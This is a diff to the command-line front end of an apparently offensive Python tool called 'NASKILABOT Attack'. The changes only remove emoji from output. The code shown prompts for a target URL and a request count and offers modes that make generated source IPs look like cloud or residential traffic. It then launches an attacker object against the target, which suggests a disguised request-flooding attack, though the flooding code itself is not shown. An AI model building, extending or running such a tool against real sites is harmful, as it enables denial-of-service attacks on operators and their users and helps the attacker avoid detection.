@@ -483,10 +483,10 @@ def get_user_input():
     try:
         num_requests = int(input("💣 Enter Number of Requests: ").strip())
     except ValueError:
-        print("❌ Error: Number of requests must be an integer!")
+        print("Error: Number of requests must be an integer!")
         sys.exit(1)
     
-    print("\n🌐 IP Generation Modes:")
+    print("\n IP Generation Modes:")
     print("1. Random IPs (Default)")
     print("2. Cloud IPs (Looks like cloud providers)")
     print("3. Residential IPs (Looks like home networks)")
@@ -497,7 +497,7 @@ def get_user_input():
     ip_mode = ip_modes.get(ip_choice, "random")
     
     if not target_url or num_requests <= 0:
-        print("❌ Error: Enter a valid URL and a positive number of requests!")
+        print("Error: Enter a valid URL and a positive number of requests!")
         sys.exit(1)
     
     return target_url, num_requests, ip_mode
@@ -506,11 +506,11 @@ if __name__ == "__main__":
     try:
         target_url, num_requests, ip_mode = get_user_input()
         
-        print(f"\n🚀Starting NASKILABOT Attack...")
-        print(f"🎯 Target: {target_url}")
-        print(f"💣 Requests: {num_requests}")
-        print(f"🌐 IP Mode: {ip_mode}")
-        print(f"⏰ Start Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
+        print(f"\n_Starting NASKILABOT Attack...")
+        print(f" Target: {target_url}")
+        print(f" Requests: {num_requests}")
+        print(f" IP Mode: {ip_mode}")
+        print(f" Start Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
         print("\n" + "="*60)
         
         attacker = CliAttacker(target_url, num_requests, ip_mode)
